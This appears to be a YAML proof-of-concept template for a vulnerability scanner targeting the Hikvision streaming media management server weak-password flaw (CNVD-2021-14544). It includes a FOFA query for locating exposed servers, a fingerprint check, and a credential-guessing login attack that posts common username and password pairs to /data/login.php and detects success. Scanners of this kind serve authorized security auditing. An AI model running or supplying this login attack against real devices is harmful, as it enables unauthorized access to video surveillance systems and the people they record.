id: poc-yaml-hikvision-streaming-media-weak-password-cnvd-2021-14544
info:
  name: 海康威视 流媒体管理服务器弱口令漏洞(CNVD-2021-14544)
  severity: medium
  tags:
  - 两高一弱
  - 弱口令
  - CNVD-2021-14544
  finger: 流媒体管理服务器
  fofa: body="杭州海康威视系统技术有限公司 版权所有" && title="流媒体管理服务器"
variables:
  username: 'admin

    admin123

    root

    '
  password: '123456

    password

    admin123

    P@ssw0rd

    '
firstRequest:
  method: GET
  path: /
  expression: status_code == 200 && ( contains(body,"<TITLE>流媒体管理服务器</TITLE>") ||
    contains(body,"Video Transmission Management Server") )
requests:
- method: POST
  path: /data/login.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: userName={{.username}}&password={{.password}}
  expression: status_code == 200 && trim(body) == "0"
transport: http
